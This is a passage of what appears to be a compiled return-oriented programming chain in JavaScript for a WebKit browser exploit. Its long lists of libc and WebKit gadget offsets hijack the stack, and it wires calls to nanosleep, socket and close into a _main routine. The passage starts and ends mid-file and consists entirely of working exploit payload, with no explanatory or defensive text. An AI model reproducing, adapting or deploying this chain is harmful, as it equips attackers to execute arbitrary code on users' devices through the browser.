libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+489696, //pop rsp
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5236215, //and rax, rcx
libc_base+772328, //pop rcx
nanosleep_addr,
webkit_base+2989859, //mov [rax], rcx
libc_base+713278 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+189848, //L2922
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+489696 //pop rsp
]);
//L2922:
db([0, 0]); // 0x0
//L2651:
set_gadget(libc_base+713278,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+608613, //pop rdx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+17972187, //pop r9
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+765305, //xor rax, rax
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+489696, //pop rsp
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5236215, //and rax, rcx
libc_base+772328, //pop rcx
socket_addr,
webkit_base+2989859, //mov [rax], rcx
libc_base+713278 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+191176, //L2923
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+489696 //pop rsp
]);
//L2923:
db([0, 0]); // 0x0
//L2906:
set_gadget(libc_base+713278,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+608613, //pop rdx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+17972187, //pop r9
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+765305, //xor rax, rax
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+489696, //pop rsp
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5236215, //and rax, rcx
libc_base+772328, //pop rcx
close_addr,
webkit_base+2989859, //mov [rax], rcx
libc_base+713278 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+192504, //L2924
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+489696 //pop rsp
]);
//L2924:
db([0, 0]); // 0x0
//_main:
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+192576, //L2926
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L2926:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+192640, //L2927
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L2927:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([2104, 0]); // 0x838
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796 //pop rax
]);
//L2929:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L2931:
ropchain+192784, //L2930
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+489696, //pop rsp
ropchain+215272, //L2932
//L2930:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+192912, //L2933
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+192944, //L2935
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+192928, //L2934
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2933:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2934:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2935:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+193088, //L2939
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+193104, //L2940
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+193072, //L2938
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L2937:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2938:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2939:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2940:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11809960, //cmp rax, rsi ; sete al
libc_base+232261, //movzx eax, al
webkit_base+426067, //shl rax, 3
libc_base+713278, //pop rsi
ropchain+193216, //L2941+8
libc_base+507828, //add rax, rsi
libc_base+145226, //mov rax, [rax]
libc_base+713278, //pop rsi
ropchain+193208, //L2941
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+489696 //pop rsp
]);
//L2941:
db([0, 0]); // 0x0
set_gadgets([
ropchain+193232, //L2941+24
ropchain+193696, //L2936
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+193304, //L2944
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2942:
db([1, 0]); // 0x1
set_gadget(libc_base+165442,); //pop rdi
//L2943:
db([1, 0]); // 0x1
set_gadget(webkit_base+3789839,); //pop r11
//L2944:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+193416, //L2945
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+193448, //L2947
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+193432, //L2946
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2945:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2946:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2947:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+193552, //L2948
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+193568, //L2949
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L2948:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2949:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+193688, //L2950
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+193672, //L2951
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2951:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L2950:
db([0, 0]); // 0x0
//L2936:
set_gadgets([
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+193784, //L2953
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+193816, //L2955
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2952:
db([0, 0]); // 0x0
set_gadget(libc_base+772328,); //pop rcx
//L2953:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2954:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2955:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+193912, //L2957
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+193896, //L2956
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2956:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2957:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796 //pop rax
]);
//L2958:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+772328 //pop rcx
]);
//L2959:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L2960:
db([1, 0]); // 0x1
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+844101, //sub rax, rcx ; sbb rdx, rcx
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796 //pop rax
]);
//L2961:
db([2, 0]); // 0x2
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2962:
db([4096, 0]); // 0x1000
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+194224, //L2964
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2964:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+72932, //or rax, rcx
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796 //pop rax
]);
//L2966:
db([1, 0]); // 0x1
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2967:
db([2, 0]); // 0x2
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+194416, //L2969
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2969:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+72932, //or rax, rcx
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2971:
db([4, 0]); // 0x4
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+194560, //L2973
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2973:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
